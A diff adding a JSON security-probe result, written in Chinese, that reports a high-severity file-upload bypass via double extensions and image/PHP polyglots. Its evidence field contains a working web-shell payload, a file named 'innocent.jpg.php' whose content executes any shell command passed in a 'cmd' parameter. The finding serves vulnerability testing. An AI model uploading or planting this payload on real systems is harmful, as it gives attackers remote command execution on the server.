@@ -1,0 +1,26 @@
+{
+  "probe_id": "S_D_01",
+  "probe_type": "D",
+  "status": "completed",
+  "security_issue_found": true,
+  "vulnerability": {
+    "type": "文件类型绕过",
+    "severity": "high",
+    "title": "仅检查文件扩展名，可通过双扩展名绕过",
+    "description": "文件上传功能只检查文件扩展名是否为图片类型，但未检查文件实际内容。攻击者可以将PHP代码保存为`.jpg.php` 或在JPEG文件中嵌入PHP代码，绕过文件类型检查上传webshell。",
+    "evidence": {
+      "vulnerability_type": "file_type_bypass",
+      "bypass_method": "double_extension_polyglot",
+      "exploit_payload": {
+        "filename": "innocent.jpg.php",
+        "file_content": "GIF89a<?php system($_GET['cmd']); ?>"
+      },
+      "upload_succeeded": true,
+      "content_type_detected_as": "image/jpeg",
+      "actual_file_type": "PHP code",
+      "severity": "high",
+      "affected_components": "文件上传验证模块",
+      "affected_users": "所有用户"
+    }
+  }
+}
